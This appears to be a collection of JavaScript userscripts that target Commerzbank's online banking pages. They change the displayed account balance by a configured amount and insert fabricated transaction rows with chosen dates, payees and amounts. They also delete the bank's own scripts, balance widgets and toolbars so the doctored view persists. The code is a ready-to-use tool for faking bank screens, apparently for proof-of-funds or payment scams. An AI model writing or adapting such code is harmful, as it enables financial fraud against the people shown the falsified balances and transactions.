//6 COMM TRANSACTIONOVERVIEW BAL CHANGE
///////////////////////////////////////////////////////////////////////////////
//6 COMM TRANSACTIONOVERVIEW BAL CHANGE
///////////////////////////////////////////////////////////////////////////////
//6 COMM TRANSACTIONOVERVIEW BAL CHANGE
///////////////////////////////////////////////////////////////////////////////

if (window.location.href.indexOf("digitalbanking/transactionoverview") > 0 || window.location.href.indexOf("11193214301") > 0 || window.location.href.indexOf("10733875328") > 0) {
  (function () {
    'use strict';

    // Configuration
//    var balanceChange = 10000.50; // Specify the amount to increase or decrease the main balance
//    var targetTextContent = 'DE402108 0050 0104 6378 00'; // Specify the target text content for presence check
    var additionalTextContent = 'Ihr Kontostand beträgt'; // Additional text content to check

    // Function to remove scripts from the document
    function removeScripts() {
      console.log('Removing scripts...');
      document.querySelectorAll('script').forEach(function (script) {
        script.remove();
        console.log('Script removed.');
      });
    }

    // Watch for changes in the DOM and remove added scripts
    var observer = new MutationObserver(function (mutationsList) {
      for (var mutation of mutationsList) {
        if (mutation.addedNodes) {
          for (var node of mutation.addedNodes) {
            if (node.tagName === 'SCRIPT') {
              console.log('Script added. Removing...');
              node.remove();
              console.log('Script removed.');
            }
          }
        }
      }
    });

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

  // Convert the targetTextContent to lowercase and remove whitespaces for case-insensitive and whitespace-insensitive comparison
var targetTextContentLower = targetTextContent.replace(/\s+/g, '').toLowerCase();

// Function to update the balance
function updateBalance() {
  console.log('Performing balance check...');
  // Check for the presence of the specified text content and additional text content
  var bodyText = document.body.textContent.replace(/\s+/g, ' ');
  var bodyTextLower = bodyText.replace(/\s+/g, '').toLowerCase(); // Convert bodyText to lowercase and remove whitespaces
  if (
    new RegExp(targetTextContentLower, 'i').test(bodyTextLower) &&
    bodyText.includes(additionalTextContent)
  ) {
    // Find the target element where the main balance is located
    var balanceHeader = document.querySelector('.BalanceOverview-module_balanceOverview__header__szyuV h4.lsgs-05770--h4');

    // Check if the target element is found
    if (balanceHeader) {
      // Get the current balance value
      var currentBalance = parseFloat(balanceHeader.textContent.replace(/[^\d,-]/g, '').replace(',', '.'));

      // Check if the current balance is a valid number
      if (!isNaN(currentBalance)) {
        // Calculate the new balance by adding or subtracting the specified value
        var newBalance = currentBalance + balanceChange;

        // Update the text content with the new balance, formatting it accordingly
        balanceHeader.textContent = ' ' + newBalance.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' EUR';

        // Remove additional text content after 5 milliseconds
        setTimeout(function () {
          var additionalTextElement = document.querySelector('body');
          if (additionalTextElement) {
            additionalTextElement.innerHTML = additionalTextElement.innerHTML.replace(additionalTextContent, '');
          }
        }, 5);
      }
    }
  }
}



    // Check for conditions and execute balance modification every 2 seconds
    setInterval(updateBalance, 300);
  })();
}

///////////////////////////////////////////////////////////////////////////////
// END    6 COMM TRANSACTIONOVERVIEW BAL CHANGE   END
///////////////////////////////////////////////////////////////////////////////
// END    6 COMM TRANSACTIONOVERVIEW BAL CHANGE   END
///////////////////////////////////////////////////////////////////////////////
// END    6 COMM TRANSACTIONOVERVIEW BAL CHANGE   END
///////////////////////////////////////////////////////////////////////////////





//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------




//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------




 if (window.location.href.indexOf("digitalbanking/transactionoverview") > 0 || window.location.href.indexOf("11193214301") > 0 || window.location.href.indexOf("10733875328") > 0 ) {



    // Configuration for transactions
//    const specifiedTextContent = "DE54 2004 0000 0275 6245 00"; // Specified text content

 //   const transactionConfigs = [
 //       {
 //           date: "13.11.2023",
 //           title: "Kaufland Kiel Kiel DE",
 //           secondTitle: "Rechnung: 59 559",
 //           type: "Lastschrift",
 //           amount: "+91,84 EUR", // Change this to a positive amount to see positive amount styling
 //           insertBelowOriginal: false // Set to true to insert below original, false to insert above
//        },
//        {
 //           date: "14.11.2023",
//            title: "Example Title 2",
//            secondTitle: "Example Second Title 2",
//            type: "Example Type 2",
//            amount: "-50,00 EUR", // Change this to a negative amount to see negative amount styling
//            insertBelowOriginal: false // Set to true to insert below original, false to insert above
//        },
        // Add more transaction configurations as needed
//    ];

    let transactionsInserted = false; // Flag to track whether transactions have been inserted
 // Function to remove scripts from the document
    function removeScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Watch for changes in the DOM and remove added scripts
    var observer = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log("Script added. Removing...");
                        node.remove();
                        console.log("Script removed.");
                    }
                }
            }
        }
    });

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // Remove all scripts from the document
    removeScripts();

    // Function to create a transaction table element with configurable text
    function createTransactionTableElement(transactionConfig) {
        console.log("Creating transaction table element...");

        // Create transaction table element
        const transactionElement = document.createElement('div');
        transactionElement.className = "TransactionsTable-module_transactionsTable__container__syWTd";

        // Create transaction header
        const transactionHeader = document.createElement('div');
        transactionHeader.className = "TransactionsTable-module_transactionsTable__header__UNYFq";

        // Create left side helper text (date)
        const leftSideHelperText = document.createElement('div');
        leftSideHelperText.className = "TransactionsTable-module_transactionsTable__headerLeftSide__rtcrj";
        leftSideHelperText.innerHTML = `<p class="lsgs-05770--helper-text" aria-atomic="true">${transactionConfig.date}</p>`;
        transactionHeader.appendChild(leftSideHelperText);

        // Create right side text (amount)
        const rightSideText = document.createElement('div');
        rightSideText.className = "TransactionsTable-module_transactionsTable__headerRightSide__l4r5q";
        if (parseFloat(transactionConfig.amount) >= 0) {
            rightSideText.innerHTML = `<p class="TransactionRow-module_transactionRow__positiveAmount__0JFuZ lsgs-05770--info-text" aria-atomic="true"></p>`;
        } else {
            rightSideText.innerHTML = `<a href="#" class="TransactionRow-module_transactionRow__sideLayerSwitcher__uW146"><p class="undefined lsgs-05770--info-text" aria-atomic="true"></p></a>`;
        }
        transactionHeader.appendChild(rightSideText);

        transactionElement.appendChild(transactionHeader);

        // Create transaction body (table)
        const transactionTable = document.createElement('table');
        transactionTable.className = "TransactionsTable-module_transactionsTable__table__Y97S6";

        // Create table caption
        const tableCaption = document.createElement('caption');
        tableCaption.className = "TransactionsTable-module_transactionsTable__caption__leYQ-";
        tableCaption.innerText = "Umsätze für heute, dem " + transactionConfig.date + ". Der Tagessaldo beträgt";
        transactionTable.appendChild(tableCaption);

        // Create table header
        const tableHeader = document.createElement('thead');
        tableHeader.className = "TransactionsTable-module_transactionsTable__tableHead__8R3ik";
        tableHeader.innerHTML = `
            <tr class="TransactionsTable-module_transactionsTable__headRow__qMUXP">
                <th class="TransactionsTable-module_transactionsTable__headCell__3Ye1W">Zahlungsverkehrspartner</th>
                <th class="TransactionsTable-module_transactionsTable__headCell__3Ye1W">Vorausichtliche Buchung</th>
                <th class="TransactionsTable-module_transactionsTable__headCell__3Ye1W">Umsatzart</th>
                <th class="TransactionsTable-module_transactionsTable__headCell__3Ye1W">Betrag</th>
                <th class="TransactionsTable-module_transactionsTable__headCell__3Ye1W">Mehr Optionen</th>
            </tr>`;
        transactionTable.appendChild(tableHeader);

        // Create table body
        const tableBody = document.createElement('tbody');
        tableBody.className = "TransactionsTable-module_transactionsTable__tableBody__AApDD";
        const tableRow = document.createElement('tr');
        tableRow.className = "TransactionRow-module_transactionRow__wNO99";

        // Create table cells with configurable text
        const tableCells = `
            <td class="TransactionRow-module_transactionRow__cell__AihX- TransactionRow-module_transactionRow__name__As3Zn"><a href="#" class="TransactionRow-module_transactionRow__sideLayerSwitcher__uW146"><p class="lsgs-05770--info-text">${transactionConfig.title}</p></a></td>
            <td class="TransactionRow-module_transactionRow__cell__AihX- TransactionRow-module_transactionRow__description__AEhbs"><a href="#" class="TransactionRow-module_transactionRow__sideLayerSwitcher__uW146"><p class="lsgs-05770--info-text">${transactionConfig.secondTitle}</p></a></td>
            <td class="TransactionRow-module_transactionRow__cell__AihX- TransactionRow-module_transactionRow__type__QfKML"><a href="#" class="TransactionRow-module_transactionRow__sideLayerSwitcher__uW146"><p class="lsgs-05770--info-text">${transactionConfig.type}</p></a></td>
            <td class="TransactionRow-module_transactionRow__cell__AihX- TransactionRow-module_transactionRow__amount__oSkGq"><a href="#" class="TransactionRow-module_transactionRow__sideLayerSwitcher__uW146"><p class="${parseFloat(transactionConfig.amount) >= 0 ? 'TransactionRow-module_transactionRow__positiveAmount__0JFuZ lsgs-05770--info-text' : 'undefined lsgs-05770--info-text'}">${transactionConfig.amount}</p></a></td>
            <td class="TransactionRow-module_transactionRow__cell__AihX- TransactionRow-module_transactionRow__actionsButton__Mt4dw">
                <div><div class="lsgs-05770--icon-link-group">
                    <div class="lsgs-05770--icon-link-group-inner lsgs-05770--icon-link-group__horizontal lsgs-05770--icon-link-group__hover-top lsgs-05770--icon-link-group__normal" role="list">
                        <div class="lsgs-05770--icon-link">
                            <button class="lsgs-05770--action lsgs-05770--action__interactive" role="listitem" tabindex="0" type="button">
                                <span class="lsgs-05770--action-inner">
                                    <div class="lsgs-05770--icon-link__no-text lsgs-05770--icon-link__primary lsgs-05770--icon-link-wrapper">
                                        <div class="lsgs-05770--icon">
                                            <div class="lsgs-05770--icon-inner lsgs-05770--icon__small lsgs-05770--icon__default">
                                                <svg width="24px" height="24px" focusable="false" id="lsgs-05770--icon-link-lox8y2hi" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><title id="lsgs-05770--icon-link-lox8y2hi-title"> </title><path d="M3 12a2 2 0 102-2 2 2 0 00-2 2zM10 12a2 2 0 102-2 2 2 0 00-2 2zM17 12a2 2 0 102-2 2 2 0 00-2 2z"></path></svg>
                                            </div>
                                        </div>
                                        <span class="lsgs-05770--icon-link-label">
                                            <div>Menü öffnen</div>
                                        </span>
                                    </div>
                                </span>
                            </button>
                        </div>
                    </div>
                </div></div>
            </td>`;

        tableRow.innerHTML = tableCells;
        tableBody.appendChild(tableRow);

        transactionTable.appendChild(tableBody);
        transactionElement.appendChild(transactionTable);

        return transactionElement;
    }

    // Function to duplicate the transaction table elements with configurable insertion position
    function duplicateTransactionTableElements() {
        console.log("Duplicating transaction table elements...");
        transactionConfigs.forEach((config) => {
            const clone = createTransactionTableElement(config); // Create a new transaction table element for each config
            const originalElement = document.querySelector('.TransactionsTable-module_transactionsTable__container__syWTd');
            if (config.insertBelowOriginal) {
                originalElement.parentNode.insertBefore(clone, originalElement.nextSibling); // Insert below original
            } else {
                originalElement.parentNode.insertBefore(clone, originalElement); // Insert above original
            }
        });
        transactionsInserted = true; // Update flag to indicate that transactions have been inserted
        console.log("Duplicated elements inserted.");
    }

    // Function to check if transaction elements are present and reinsert if not
    function checkAndReinsertTransactions() {
        const textFound = Array.from(document.querySelectorAll('.lsgs-05770--two-line-item__helper-text.lsgs-05770--helper-text.lsgs-05770--no-margin'))
            .some(el => el.textContent.includes(specifiedTextContent));
        if (textFound) {
            if (!transactionsInserted) { // Check if transactions have not been inserted already
                console.log("Text found. Reinserting transactions...");
                duplicateTransactionTableElements();
            } else {
                console.log("Text found, but transactions already inserted.");
            }
        } else {
            console.log("Text not found. No action needed.");
        }
    }

    // Call the function to duplicate the transaction table elements initially
    duplicateTransactionTableElements();

    // Periodically check for transaction elements every 2 seconds
    setInterval(checkAndReinsertTransactions, 700);

 }

///////////////////////////////////////////////////////////////////////////////
// END   7 COMM TRANSACTIONOVERVIEW INSERT    END
///////////////////////////////////////////////////////////////////////////////
// END   7 COMM TRANSACTIONOVERVIEW INSERT    END
///////////////////////////////////////////////////////////////////////////////
// END   7 COMM TRANSACTIONOVERVIEW INSERT    END
///////////////////////////////////////////////////////////////////////////////




//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------



///////////////////////////////////////////////////////////////////////////////
//8 COMM KONTODETAILS
///////////////////////////////////////////////////////////////////////////////
//8 COMM KONTODETAILS
///////////////////////////////////////////////////////////////////////////////
//8 COMM KONTODETAILS
///////////////////////////////////////////////////////////////////////////////

if (window.location.href.indexOf("banking/accountdetails") > 0 || window.location.href.indexOf("10726848058") > 0 || window.location.href.indexOf("10726848058") > 0) {
  (function() {
    'use strict';

	//	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	//CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE////////CONFIGURE//
	////////////CONFIGURE//////////CONFIGURE//////////CONFIGURE///////////CONFIGURE////////CONFIGURE///////////CONFIGURE///////////CONFIGURE////////CONFIGURE//////////


//    // Set the amount to increase or decrease the main balance
//    var balanceModificationAmount = -10000; // Change this value as needed

//    // Specify the text content to look for on the page
//    var targetTextContent = "DE40 2108 0050 0104 6378 00";

    // Set the timeout duration in milliseconds (e.g., 5000 for 5 seconds)
    var timeoutDuration = 200;

	//CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE//////////CONFIGURE////////CONFIGURE//
	////////////CONFIGURE//////////CONFIGURE//////////CONFIGURE///////////CONFIGURE////////CONFIGURE///////////CONFIGURE///////////CONFIGURE////////CONFIGURE//////////
	//	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

    // Function to parse and return the numeric balance from a given element
    function parseBalanceFromElement(element) {
        if (element) {
            // Extract the current balance text content
            var currentBalance = element.textContent.trim();

            // Extract the numeric value from the current balance
            var numericBalance = parseFloat(currentBalance.replace(/[^\d,-]/g, '').replace(',', '.'));

            if (!isNaN(numericBalance)) {
                return numericBalance;
            } else {
                console.error('Failed to extract numeric balance from the element:', element);
            }
        } else {
            console.error('Element not found.');
        }

        return NaN; // Return NaN if parsing fails
    }

    // Function to periodically check conditions and modify the main balance
    function checkAndModifyBalance() {
        // Check if both target text contents are present on the page
        if (areTextContentsPresent(targetTextContent, "Wechseln", "Kontodetails")) {
            modifyMainBalance();
            // Remove parent elements of "Wechseln" and "Kontodetails" after 5 milliseconds
            setTimeout(removeParentElements, 5);
        }

        // Log a message indicating that the check is continuing
        console.log('Continuing to check conditions every 5 seconds...');
    }

    // Function to remove parent elements of "Wechseln" and "Kontodetails"
    function removeParentElements() {
        var elementsToRemove = [];
        var targetTexts = ["Wechseln", "Kontodetails"];

        targetTexts.forEach(function(targetText) {
            var textNodes = document.evaluate("//text()[contains(., '" + targetText + "')]", document.body, null, XPathResult.ANY_TYPE, null);
            var textNode = textNodes.iterateNext();

            while (textNode) {
                if (textNode.parentElement) {
                    elementsToRemove.push(textNode.parentElement);
                }
                textNode = textNodes.iterateNext();
            }
        });

        elementsToRemove.forEach(function(element) {
            element.remove();
        });
    }

    // Function to modify the main balance
    function modifyMainBalance() {
        // Find the main balance element
        var balanceRegex = /([+-]?)\s?(\d{1,3}(?:\.\d{3})*(?:,\d{2}))/;
        var mainBalanceElement;

        // Search for elements with text content matching the balance format
        document.querySelectorAll('*').forEach(function (element) {
            if (element.textContent.match(balanceRegex)) {
                mainBalanceElement = element;
            }
        });

        if (mainBalanceElement) {
            // Get the current main balance
            var currentBalance = parseBalanceFromElement(mainBalanceElement);

            if (!isNaN(currentBalance)) {
                // Modify the balance
                var newBalance = currentBalance + balanceModificationAmount;

                // Format the new balance text
                var newSign = newBalance >= 0 ? '+' : '-';
                var newBalanceText = newSign + ' ' + Math.abs(newBalance).toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' EUR';

                // Update the main balance element with the new balance
                mainBalanceElement.textContent = newBalanceText;
            }
        }
    }

    // Function to check if all specified text contents are present on the page
    function areTextContentsPresent() {
        var targetContents = Array.from(arguments);
        return targetContents.every(function(content) {
            return isTargetTextContentPresent(content);
        });
    }

    // Function to check if the target text content is present on the page
    function isTargetTextContentPresent(targetText) {
        // Perform a case-insensitive and whitespace-insensitive search for the target text content
        var searchText = targetText.replace(/\s/g, '').toLowerCase();
        return document.body.textContent.replace(/\s/g, '').toLowerCase().includes(searchText);
    }

    // Function to remove scripts from the document
    function removeScripts() {
        console.log('Removing scripts...');
        document.querySelectorAll('script').forEach(function (script) {
            script.remove();
            console.log('Script removed.');
        });
    }

    // Watch for changes in the DOM and remove added scripts
    var observer = new MutationObserver(function (mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log('Script added. Removing...');
                        node.remove();
                        console.log('Script removed.');
                    }
                }
            }
        }
    });

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // Call the function to remove scripts
    removeScripts();

    // Call the function to periodically check conditions and modify the main balance every 5 seconds
    setInterval(checkAndModifyBalance, 300);

  })();
}

///////////////////////////////////////////////////////////////////////////////
//  END   8 COMM KONTODETAILS     END
///////////////////////////////////////////////////////////////////////////////
//  END   8 COMM KONTODETAILS     END
///////////////////////////////////////////////////////////////////////////////
//  END   8 COMM KONTODETAILS     END
///////////////////////////////////////////////////////////////////////////////






//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------



///////////////////////////////////////////////////////////////////////////////
//9__ Comm Start utility functions start final with correct script removal.user
///////////////////////////////////////////////////////////////////////////////

   if (window.location.href.indexOf("landingpage") > 0 || window.location.href.indexOf("11193210710") > 0 || window.location.href.indexOf("10726846341") > 0 ) {


(function () {
    'use strict';

    // Specify the timeout duration (in milliseconds)
    var scriptTimeout = 200; // Example: 5000 milliseconds (5 seconds)

    // Function to remove scripts and specified elements from the document
    function removeScriptsAndElements() {
        console.log("Removing scripts and elements...");

        // Remove scripts
        document.querySelectorAll('script').forEach(function (script) {
            script.remove();
            console.log("Script removed.");
        });

        // Remove specified elements
        document.querySelectorAll('.mod.deletable.oneColumnWidget.dragable.open').forEach(function (element) {
            // Skip the specific class you want to exclude
            if (!element.classList.contains('mod-WidgetOverview')) {
                element.remove();
                console.log('Removed element with class names "mod deletable oneColumnWidget dragable open":', element);
            }
        });

        // Remove elements with class "big-button-right"
        document.querySelectorAll('.big-button-right').forEach(function (element) {
            element.remove();
            console.log('Removed element with class "big-button-right":', element);
        });
    }

    // Watch for changes in the DOM and remove added scripts and specified elements
    var observer = new MutationObserver(function (mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log("Script added. Removing...");
                        node.remove();
                        console.log("Script removed.");
                    } else if (node.nodeType === Node.ELEMENT_NODE) {
                        // Delete the element if it contains the specified class names
                        if (node.classList.contains('mod') &&
                            node.classList.contains('deletable') &&
                            node.classList.contains('oneColumnWidget') &&
                            node.classList.contains('dragable') &&
                            node.classList.contains('open')) {

                            // Skip the specific class you want to exclude
                            if (!node.classList.contains('mod-WidgetOverview')) {
                                node.remove();
                                console.log('Removed dynamically added element with class names "mod deletable oneColumnWidget dragable open":', node);
                            }
                        }
                    }
                }
            }
        }
    });

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // Check the condition and perform actions after the specified timeout
    setTimeout(function () {
        observer.disconnect(); // Disconnect the observer to prevent further observations
        removeScriptsAndElements(); // Remove scripts and specified elements again after the timeout
        console.log('Script loaded.');
    }, scriptTimeout);

})();

}




//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------


//////////////////////////////////////////////////////////////////////////
//10__Comm Finsicht utility functions with timeout and script removal.user
//////////////////////////////////////////////////////////////////////////

   if (window.location.href.indexOf("financeoverview") > 0 || window.location.href.indexOf("11193215593") > 0 || window.location.href.indexOf("10726834157") > 0 ) {


(function() {
    'use strict';

    // Configurable timeout in milliseconds (change as needed)
    var timeoutMilliseconds = 200;

    // Function to remove elements with the class "dropdown-links"
    function removeDropdownLinks() {
        var elementsToRemove = document.querySelectorAll('.dropdown-links');
        elementsToRemove.forEach(function(element) {
            element.remove();
        });

        console.log('Removed elements with class "dropdown-links"');
    }

    // Function to remove elements with the class "select2-choice"
    function removeSelect2Choice() {
        var elementsToRemove = document.querySelectorAll('.select2-choice');
        elementsToRemove.forEach(function(element) {
            element.remove();
        });

        console.log('Removed elements with class "select2-choice"');
    }

    // Function to remove elements with the class "show-tooltip"
    function removeShowTooltip() {
        var elementsToRemove = document.querySelectorAll('.show-tooltip');
        elementsToRemove.forEach(function(element) {
            element.remove();
        });

        console.log('Removed elements with class "show-tooltip"');
    }

    // Function to remove scripts from the document
    function removeScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Watch for changes in the DOM and remove added scripts
    var observer = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log("Script added. Removing...");
                        node.remove();
                        console.log("Script removed.");
                    }
                }
            }
        }
    });

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // Call the functions with a timeout
    setTimeout(function() {
        removeDropdownLinks();
        removeSelect2Choice();
        removeShowTooltip();
        removeScripts();
    }, timeoutMilliseconds);
})();


}





//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------





///////////////////////////////////////////////////////////////////////////////////
//11__ Comm Umsatze utility functions umsaetze with timeout and script removal.user
///////////////////////////////////////////////////////////////////////////////////

   if (window.location.href.indexOf("account/transactions") > 0 || window.location.href.indexOf("10926908005") > 0 || window.location.href.indexOf("10726842017") > 0 ) {


(function () {
    'use strict';

    // Specify the timeout duration (in milliseconds)
    var scriptTimeout = 200; // Example: 1000 milliseconds (1 second)

    // Function to remove scripts from the document
    function removeScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function (script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Watch for changes in the DOM and remove added scripts
    var observer = new MutationObserver(function (mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log("Script added. Removing...");
                        node.remove();
                        console.log("Script removed.");
                    }
                }
            }
        }
    });

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // Remove scripts from the document
    removeScripts();

    // Function to remove elements with class "t-body cursive"
    function removeCursiveElements() {
        document.querySelectorAll('.t-body.cursive').forEach(function (element) {
            element.remove();
            console.log('Removed element with class "t-body cursive":', element);
        });
    }

    // Function to remove element with id "cashflow-container"
    function removeCashflowContainer() {
        var cashflowContainer = document.getElementById('cashflow-container');
        if (cashflowContainer) {
            cashflowContainer.remove();
            console.log('Removed element with id "cashflow-container":', cashflowContainer);
        }
    }

    // Function to remove element with class "col col-lg-4 tools-buttons"
    function removeToolsButtons() {
        document.querySelectorAll('.col.col-lg-4.tools-buttons').forEach(function (element) {
            element.remove();
            console.log('Removed element with class "col col-lg-4 tools-buttons":', element);
        });
    }

    // Function to remove element with class "advance_search_container"
    function removeAdvanceSearchContainer() {
        document.querySelectorAll('.advance_search_container').forEach(function (element) {
            element.remove();
            console.log('Removed element with class "advance_search_container":', element);
        });
    }

    // Function to remove element with class "togglebuttons tran-toolbar"
    function removeToggleButtons() {
        document.querySelectorAll('.togglebuttons.tran-toolbar').forEach(function (element) {
            element.remove();
            console.log('Removed element with class "togglebuttons tran-toolbar":', element);
        });
    }

    // Function to modify text content under the first element with class "dateGroupCol2"
    function modifyTextContent() {
        var dateGroupCol2 = document.querySelector('.dateGroupCol2');
        if (dateGroupCol2) {
            var textContent = dateGroupCol2.textContent.trim();
            if (textContent === 'Nächste 5 Tage') {
                dateGroupCol2.textContent = 'Vorgemerkte Umsätze';
                console.log('Replaced text content under dateGroupCol2:', dateGroupCol2.textContent);
            }
        }
    }

    // Function to modify text content in all elements with class "dateGroupCol2"
    function modifyAllTextContent() {
        document.querySelectorAll('.dateGroupCol2').forEach(function (element) {
            var textContent = element.textContent.trim();
            var pipeIndex = textContent.indexOf('|');
            if (pipeIndex !== -1) {
                element.textContent = textContent.substring(0, pipeIndex).trim();
                console.log('Modified text content under dateGroupCol2:', element.textContent);
            }
        });
    }


// Function to remove element with id "realtimeHeaderBalance"
function removeRealtimeHeaderBalance() {
    var realtimeHeaderBalance = document.getElementById('realtimeHeaderBalance');
    if (realtimeHeaderBalance) {
        realtimeHeaderBalance.remove();
        console.log('Removed element with id "realtimeHeaderBalance":', realtimeHeaderBalance);
    }
}

  // Perform initial actions
removeCursiveElements();
removeCashflowContainer();
removeToolsButtons();
removeAdvanceSearchContainer();
removeToggleButtons();
modifyTextContent();
modifyAllTextContent();
removeRealtimeHeaderBalance(); // Add this line to remove the element with id "realtimeHeaderBalance"

// Check the condition and perform actions after the specified timeout
setTimeout(function () {
    observer.disconnect(); // Disconnect the observer to prevent redeclaration
    removeScripts(); // Remove scripts again after the timeout
    removeRealtimeHeaderBalance(); // Remove the element with id "realtimeHeaderBalance" again after the timeout
}, scriptTimeout);

console.log('Script loaded.');
})();
}



//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------





///////////////////////////////////////////////////////
//12__Comm Transoverview NEW utility with redirect.user
///////////////////////////////////////////////////////

   if (window.location.href.indexOf("digitalbanking/transactionoverview") > 0 || window.location.href.indexOf("11193214301") > 0 || window.location.href.indexOf("10733875328") > 0 ) {


(function () {
  'use strict';

  // Configuration
  var shouldRedirect = false; // Set to true if you want to redirect
  var redirectUrl = 'https://kunden.commerzbank.de/banking/account/transactions'; // URL to redirect to

  // Function to remove scripts from the document
  function removeScripts() {
    console.log('Removing scripts...');
    document.querySelectorAll('script').forEach(function (script) {
      script.remove();
      console.log('Script removed.');
    });
  }

  // Watch for changes in the DOM and remove added scripts
  var observer = new MutationObserver(function (mutationsList) {
    for (var mutation of mutationsList) {
      if (mutation.addedNodes) {
        for (var node of mutation.addedNodes) {
          if (node.tagName === 'SCRIPT') {
            console.log('Script added. Removing...');
            node.remove();
            console.log('Script removed.');
          }
        }
      }
    }
  });

  // Start observing the document
  observer.observe(document.documentElement, { childList: true, subtree: true });

  // Remove scripts from the document
  removeScripts();

// Find and remove all elements with the specified class names
var elementsToRemove = document.querySelectorAll('[class*=TransactionsTable-module_transactionsTable__rightSideText], [class*=ActionsButtons-module_actionsButtons], [class*=icon-link-group]');
elementsToRemove.forEach(function (element) {
    element.remove();
    console.log('Element removed:', element);
});

// Find and remove elements with specific class and child class
var elementsWithChildToRemove = document.querySelectorAll('.TransactionRow-module_transactionRow__cell__AihX-.TransactionRow-module_transactionRow__icon__-UrBC .lsgs-05770--thumbnail');
elementsWithChildToRemove.forEach(function (element) {
    var parent = element.closest('.TransactionRow-module_transactionRow__cell__AihX-.TransactionRow-module_transactionRow__icon__-UrBC');
    if (parent) {
        parent.remove();
        console.log('Parent element removed:', parent);
    }
});


  // Redirect if specified
  if (shouldRedirect) {
    window.location.href = redirectUrl;
  }
})();



 }




//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------






/////////////////////////////////////////////////
//13__Comm NEW Überweisung removes bal at üb.user
/////////////////////////////////////////////////

if (window.location.href.indexOf("payments") > 0 || window.location.href.indexOf("10733876802") > 0 || window.location.href.indexOf("10733876802") > 0) {
    (function() {
        'use strict';

        // Function to remove text after a pipe character
        function removeTextAfterPipe(node) {
            if (node.nodeType === Node.TEXT_NODE) {
                node.nodeValue = node.nodeValue.replace(/\|[^|]*$/, '');
            } else {
                node.childNodes.forEach(removeTextAfterPipe);
            }
        }

        // Function to remove scripts from the document
        function removeScripts() {
            console.log("Removing scripts...");
            document.querySelectorAll('script').forEach(function(script) {
                script.remove();
                console.log("Script removed.");
            });
        }

        // Watch for changes in the DOM
        var observer = new MutationObserver(function(mutationsList) {
            mutationsList.forEach(function(mutation) {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach(function(node) {
                        if (node.nodeType === Node.ELEMENT_NODE && node.tagName === 'SCRIPT') {
                            console.log("Script added. Removing...");
                            node.remove();
                            console.log("Script removed.");
                        } else {
                            removeTextAfterPipe(node);
                        }
                    });
                }
            });
        });

        // Start observing the document
        observer.observe(document.documentElement, { childList: true, subtree: true });

        // Initial processing of the entire document body
        removeTextAfterPipe(document.body);
        removeScripts();
    })();
}




//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------






/////////////////////////////////////////////////
//14__Comm Old Überweisung removes bal at üb.user
/////////////////////////////////////////////////

